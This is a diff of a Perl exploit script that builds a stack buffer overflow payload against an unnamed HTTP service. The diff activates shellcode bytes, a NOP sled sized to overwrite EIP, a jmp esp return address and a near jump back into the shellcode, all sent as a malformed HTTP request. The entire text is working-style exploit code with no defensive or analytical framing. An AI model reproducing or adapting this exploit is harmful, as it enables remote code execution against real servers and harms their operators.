@@ -15,12 +15,15 @@ $shellcode = "\xdb\xc0\x31\xc9\xbf\x7c\x16\x70\xcc\xd9\x74\x24\xf4\xb1" .
 "\xb6\x0e\x2f\x85\x19\x87\xb7\x78\x2f\x59\x90\x7b\xd7\x05" .
 "\x7f\xe8\x7b\xca";
 
-$payload = "\x90" x 1011;# - length($shellcode); # Distance to overwrite EIP
-#$payload.=$shellcode;
-#$payload.="\xcc" x 8; #Spacer between EIP and shellcode
-#$payload.= "\x53\x93\x42\x7e"; #Overwrite EIP with jmp esp
-$payload.="AAAA";
-$payload.= "ZZZZ"."\xcc\xcc\xcc\xcc"; #4 first bytes to pad out then last 4 bytes into esp
+#$shellcode = "ABCDEFGHIJKL/MNOPQRSTUVWXYZ";
+$dist=1003-length($shellcode);
+$payload = "\x90"x$dist; # Distance to overwrite EIP
+$payload.=$shellcode;
+$payload.="\xcc" x 8; #Spacer between EIP and shellcode
+$payload.= "\x53\x93\x42\x7e"; #Overwrite EIP with jmp esp
+#$payload.="AAAA";
+#$payload.= "ZZZZ"."\xcc\xcc\xcc\xccYYYY"; #4 first bytes to pad out then last 4 bytes into esp
+$payload.="\x90\x90\x90\x90\xcc\xE9\xD4\xFE\xFF\xFF"; #stack padding + BP + Near jmp-300
 $payload.=" / HTTP/1.0\r\n\r\n"; # Needs to be a valid HTTP request
 
 print $payload;
